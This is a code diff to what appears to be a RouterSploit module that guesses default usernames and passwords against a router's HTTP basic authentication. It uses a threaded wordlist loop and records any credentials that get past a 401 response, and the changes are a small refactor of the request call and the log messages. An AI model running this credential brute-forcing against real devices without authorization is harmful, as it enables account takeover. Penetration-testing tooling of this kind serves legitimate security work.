@@ -1,5 +1,4 @@
 import threading
-import requests
 
 from routersploit import (
     exploits,
@@ -12,7 +11,7 @@ from routersploit import (
     sanitize_url,
     boolify,
     http_request,
-    multi
+    multi,
 )
 
 
@@ -28,7 +27,7 @@ class Exploit(exploits.Exploit):
         ]
     }
 
-    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
+    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
     port = exploits.Option(80, 'Target port') 
     threads = exploits.Option(8, 'Number of threads')
     defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
@@ -82,14 +81,15 @@ class Exploit(exploits.Exploit):
                 line = data.next().split(":")
                 user = line[0].encode('utf-8').strip()
                 password = line[1].encode('utf-8').strip()
-                r = requests.get(url, auth=(user, password), verify=False)
 
-                if r.status_code != 401:
+                response = http_request(method="GET", url=url, auth=(user, password))
+
+                if response.status_code != 401:
                     running.clear()
-                    print_success("Target: {}:{} {}: Authentication succeed!".format(self.target, self.port, name), user, password, verbose=module_verbosity)
+                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                     self.credentials.append((self.target, self.port, user, password))
                 else:
-                    print_error(name, "Target: {}:{} Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, user, password), verbose=module_verbosity)
+                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
             except StopIteration:
                 break
 
